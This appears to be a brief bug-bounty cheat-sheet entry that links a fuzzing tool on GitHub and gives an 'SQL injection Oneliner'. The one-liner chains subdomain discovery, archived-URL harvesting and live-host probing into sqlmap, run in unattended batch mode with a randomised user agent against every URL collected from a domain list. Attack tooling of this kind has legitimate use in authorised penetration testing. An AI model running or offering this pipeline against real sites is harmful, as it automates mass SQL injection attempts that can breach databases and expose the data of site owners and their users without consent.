# Tools
https://github.com/root-tanishq/userefuzz

SQL injection Oneliner.
subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
